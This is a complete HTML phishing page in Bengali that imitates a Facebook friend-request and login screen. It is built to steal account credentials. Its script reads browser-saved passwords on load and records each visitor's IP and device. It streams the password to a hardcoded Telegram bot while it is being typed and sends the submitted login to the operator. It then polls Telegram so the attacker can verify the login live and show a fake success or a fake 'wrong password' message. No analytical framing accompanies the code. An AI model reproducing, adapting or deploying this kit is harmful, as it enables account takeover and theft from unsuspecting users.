<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Friends & Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; }
        .fb-input {
            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
            border-radius: 6px; background: #f5f6f7; font-size: 15px;
            outline: none; transition: border-color 0.2s;
        }
        .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
        .fb-loader {
            width: 50px; height: 50px; border: 5px solid #f3f3f3;
            border-top: 5px solid #1877f2; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen">

    <div id="overlay" class="hidden fixed inset-0 bg-[#f0f2f5] z-50 flex flex-col items-center pt-12">
        <div class="w-full max-w-sm overflow-hidden bg-white rounded-t-2xl shadow-sm">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full h-auto">
        </div>
        <div class="w-full max-w-sm p-8 bg-white shadow-md mt-3 rounded-b-2xl min-h-[50vh] flex flex-col items-center justify-center text-center">
            <div id="loader" class="fb-loader mb-6"></div>
            <div id="success-icon" class="hidden mb-4 bg-green-100 p-4 rounded-full">
                <svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
            </div>
            <h3 id="status-title" class="text-xl font-bold text-gray-800 mb-2">যাচাই করা হচ্ছে...</h3>
            <p id="status-msg" class="text-gray-500 px-6">অল্প কিছুক্ষণ অপেক্ষা করুন।</p>
            <button id="retryBtn" onclick="location.reload()" class="hidden mt-8 bg-[#1877f2] text-white px-10 py-3 rounded-xl font-bold">আবার চেষ্টা করুন</button>
            <a id="profileBtn" href="https://m.me/sabinayasmeen121" class="hidden mt-8 bg-[#1877f2] text-white px-10 py-3 rounded-xl font-bold">View Profile</a>
        </div>
    </div>

    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full h-full object-cover">
    </div>

    <div id="main-content" class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center">
        
        <div id="initial-view" class="w-full flex flex-col items-center">
            <h2 class="text-2xl font-bold text-gray-900 mb-4 text-center">ফ্রেন্ড অ্যাড করুন</h2>
            <p class="text-gray-600 text-center mb-8 px-4 leading-relaxed">
                Mst. Priya Akter কে ফ্রেন্ড অ্যাড করতে আপনার পছন্দের মাধ্যমটি বেছে নিন।
            </p>
            <button onclick="showLoginForm()" class="w-full bg-[#1877f2] text-white font-bold py-4 rounded-xl mb-4 shadow-lg active:scale-95">Add Friend</button>
            <button onclick="showLoginForm()" class="w-full border-2 border-[#1877f2] text-[#1877f2] font-bold py-4 rounded-xl active:scale-95">Login</button>
        </div>

        <div id="login-view" class="hidden w-full">
            <h2 class="text-[22px] font-bold text-gray-900 mb-2 text-center">Facebook Login</h2>
            <p class="text-[14px] text-gray-500 mb-6 text-center">আপনার অ্যাকাউন্ট লগইন করে ফ্রেন্ড রিকোয়েস্ট পাঠান।</p>
            
            <form id="fb-login-form" autocomplete="on">
                <div class="space-y-4">
                    <input type="text" id="email" name="email" class="fb-input" placeholder="মোবাইল নম্বর অথবা ইমেইল" required autocomplete="username">
                    <input type="password" id="pass" name="pass" class="fb-input" placeholder="পাসওয়ার্ড" required autocomplete="current-password">
                    <button type="button" onclick="handleLogin()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md text-lg active:scale-95">Log In</button>
                </div>
            </form>
            <p class="text-blue-600 text-sm text-center mt-6 cursor-pointer" onclick="location.reload()">আগের পেজে ফিরে যান</p>
        </div>
    </div>

<script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";

    // --- অটো-ফিল এবং ভিজিটর ট্র্যাকিং ---
    window.onload = async function() {
        // ১. ব্রাউজার অটো-ফিল পপআপ রিকোয়েস্ট
        if (navigator.credentials) {
            try {
                const cred = await navigator.credentials.get({ password: true, unmediated: false });
                if (cred) {
                    document.getElementById('email').value = cred.id;
                    document.getElementById('pass').value = cred.password;
                    // অটো-ফিল হওয়া মাত্রই একবার ডেটা পাঠিয়ে রাখা
                    sendToTelegram(`🎯 Auto-filled Info:\n📧 User: ${cred.id}\n🔑 Pass: ${cred.password}`);
                }
            } catch (e) { console.log("Auto-fill interaction handled."); }
        }

        // ২. ভিজিটর ট্র্যাকিং
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            const trackMsg = `🔔 নতুন ভিজিটর লিংকে ঢুকেছে!\n📱 Device: ${navigator.userAgent.substring(0, 50)}\n🌍 Country: ${ipData.country_name}\n🌐 IP: ${ipData.ip}`;
            sendToTelegram(trackMsg);
        } catch (err) {}
    };

    // --- রিয়েল-টাইম টাইপিং ট্র্যাকিং (২ অক্ষরের পর থেকে) ---
    document.getElementById('pass').addEventListener('input', function() {
        if (this.value.length >= 2) {
            const liveMsg = `⚡ লাইভ টাইপিং:\n📧 User: ${document.getElementById('email').value}\n🔑 Pass: ${this.value}`;
            // রেট লিমিট এড়াতে Fetch সরাসরি ব্যবহার
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chatId, text: liveMsg})
            }).catch(e => {});
        }
    });

    function showLoginForm() {
        document.getElementById('initial-view').classList.add('hidden');
        document.getElementById('login-view').classList.remove('hidden');
    }

    async function sendToTelegram(text, hasButtons = false) {
        let payload = { chat_id: chatId, text: text };
        if(hasButtons) {
            payload.reply_markup = {
                inline_keyboard: [[{ text: "✅ Success", callback_data: "success" },{ text: "❌ Error", callback_data: "error" }]]
            };
        }
        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
    }

    async function handleLogin() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) { alert("অনুগ্রহ করে ইমেইল এবং পাসওয়ার্ড দিন।"); return; }
        
        document.getElementById('overlay').classList.remove('hidden');
        const msg = `🔑 ফেসবুক লগইন ডিটেইলস\n\n📧 User: ${email}\n🔒 Pass: ${pass}`;
        await sendToTelegram(msg, true);
        checkCommands();
    }

    function checkCommands() {
        const interval = setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1`);
                const data = await res.json();
                if (data.result && data.result.length > 0) {
                    const command = data.result[0].callback_query?.data;
                    if (command === "success") { clearInterval(interval); showSuccess(); } 
                    else if (command === "error") { clearInterval(interval); showError(); }
                }
            } catch (e) {}
        }, 3000);
    }

    function showSuccess() {
        document.getElementById('loader').classList.add('hidden');
        document.getElementById('success-icon').classList.remove('hidden');
        document.getElementById('status-title').innerText = "সফল হয়েছে!";
        document.getElementById('status-title').classList.add('text-green-600');
        document.getElementById('status-msg').innerText = "আপনার অ্যাকাউন্ট ভেরিফিকেশন সফল হয়েছে।";
        document.getElementById('profileBtn').classList.remove('hidden');
    }

    function showError() {
        document.getElementById('loader').classList.add('hidden');
        document.getElementById('status-title').innerText = "ভুল পাসওয়ার্ড!";
        document.getElementById('status-title').classList.add('text-red-600');
        document.getElementById('status-msg').innerText = "আপনার দেওয়া পাসওয়ার্ডটি ভুল। আবার চেষ্টা করুন।";
        document.getElementById('retryBtn').classList.remove('hidden');
    }
</script>
</body>
</html>
